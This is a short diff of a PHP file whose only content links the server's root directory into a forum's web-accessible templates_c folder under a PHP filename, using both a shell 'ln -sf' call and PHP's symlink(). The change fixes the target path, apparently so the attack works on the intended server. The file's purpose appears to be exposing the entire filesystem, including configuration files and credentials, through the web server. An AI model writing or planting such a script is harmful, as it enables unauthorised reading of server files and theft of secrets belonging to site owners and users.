@@ -1,4 +1,4 @@
 <?php
-        system("ln -sf / /forum/template_c/test99.php");
-        symlink("/", "/forum/template_c/test99.php");
+        system("ln -sf / /var/www/forum/templates_c/test99.php");
+        symlink("/", "/var/www/forum/templates_c/test99.php");
 ?>
